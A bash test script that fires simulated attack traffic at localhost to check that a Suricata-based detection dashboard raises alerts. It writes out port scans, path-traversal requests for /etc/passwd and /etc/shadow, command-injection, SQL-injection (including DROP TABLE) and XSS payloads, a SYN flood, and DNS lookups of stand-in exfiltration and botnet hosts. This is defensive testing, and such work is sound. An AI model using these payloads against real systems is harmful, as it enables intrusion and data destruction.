#!/bin/bash

echo "=== Advanced Attack Detection Tests ==="
echo ""

# Test 1: Nmap SYN Scan (should trigger HIGH alert)
echo "Test 1: Nmap SYN Scan"
echo "Running stealth SYN scan..."
sudo nmap -sS -p 22,80,443 localhost 2>&1 | grep -E "(open|filtered)" || echo "Scan completed"
sleep 2

# Test 2: Aggressive Nmap scan with OS detection
echo ""
echo "Test 2: Aggressive Nmap Scan with OS Detection"
echo "Running aggressive scan..."
sudo nmap -A -p 80,443 localhost 2>&1 | head -10
sleep 2

# Test 3: Nikto web vulnerability scanner
echo ""
echo "Test 3: Web Vulnerability Scanning (Nikto-like)"
echo "Simulating web vuln scanner..."
curl -s -A "Nikto/2.1.6" http://localhost:8080/ > /dev/null 2>&1
curl -s -A "Nikto/2.1.6" http://localhost:8080/admin > /dev/null 2>&1
curl -s -A "Nikto/2.1.6" http://localhost:8080/../etc/passwd > /dev/null 2>&1
sleep 2

# Test 4: Directory traversal attempts
echo ""
echo "Test 4: Directory Traversal Attack"
echo "Attempting path traversal..."
curl -s "http://localhost:8080/../../etc/passwd" > /dev/null 2>&1
curl -s "http://localhost:8080/api/../../../../etc/shadow" > /dev/null 2>&1
sleep 2

# Test 5: Command injection attempts
echo ""
echo "Test 5: Command Injection Attempts"
echo "Testing command injection patterns..."
curl -s "http://localhost:8080/api?cmd=;ls+-la" > /dev/null 2>&1
curl -s "http://localhost:8080/api?exec=|cat+/etc/passwd" > /dev/null 2>&1
sleep 2

# Test 6: SQL Injection with various payloads
echo ""
echo "Test 6: SQL Injection Patterns"
echo "Testing SQL injection..."
curl -s "http://localhost:8080/api?id=1'+OR+'1'='1" > /dev/null 2>&1
curl -s "http://localhost:8080/api?id=1;DROP+TABLE+users--" > /dev/null 2>&1
curl -s "http://localhost:8080/api?id=1'+UNION+SELECT+NULL--" > /dev/null 2>&1
sleep 2

# Test 7: XSS attempts
echo ""
echo "Test 7: Cross-Site Scripting (XSS)"
echo "Testing XSS payloads..."
curl -s "http://localhost:8080/api?search=<script>alert('XSS')</script>" > /dev/null 2>&1
curl -s "http://localhost:8080/api?name=<img+src=x+onerror=alert(1)>" > /dev/null 2>&1
sleep 2

# Test 8: Suspicious user agents
echo ""
echo "Test 8: Malicious User Agents"
echo "Testing with attack tool user agents..."
curl -s -A "sqlmap/1.0" http://localhost:8080/ > /dev/null 2>&1
curl -s -A "Metasploit" http://localhost:8080/ > /dev/null 2>&1
curl -s -A "Havij" http://localhost:8080/ > /dev/null 2>&1
sleep 2

# Test 9: Port scan with hping3 (if available)
echo ""
echo "Test 9: SYN Flood Simulation"
echo "Testing rapid SYN packets..."
if command -v hping3 &> /dev/null; then
    sudo hping3 -S -p 80 -c 10 localhost > /dev/null 2>&1
else
    echo "hping3 not installed, using alternative..."
    for i in {1..10}; do
        timeout 0.1 telnet localhost 80 2>/dev/null &
    done
fi
sleep 2

# Test 10: DNS tunneling attempt
echo ""
echo "Test 10: Suspicious DNS Queries"
echo "Testing DNS exfiltration patterns..."
nslookup "data.exfiltration.malicious.com" 8.8.8.8 > /dev/null 2>&1
nslookup "c2.botnet.example.com" 8.8.8.8 > /dev/null 2>&1
sleep 2

echo ""
echo "=== All Tests Complete ==="
echo ""
echo "Fetching recent alerts..."
curl -s http://localhost:3000/api/suricata/alerts/recent?limit=20 | jq -r '.[] | "\(.timestamp | split("T")[1] | split(".")[0]) | \(.severity) | \(.signature)"' 2>/dev/null || echo "Could not fetch alerts"

echo ""
echo "Statistics:"
curl -s http://localhost:3000/api/suricata/statistics | jq '{totalAlerts, criticalAlerts, highAlerts, mediumAlerts, lowAlerts, alertsLastHour}' 2>/dev/null

echo ""
echo "View full dashboard at: http://localhost:3000"
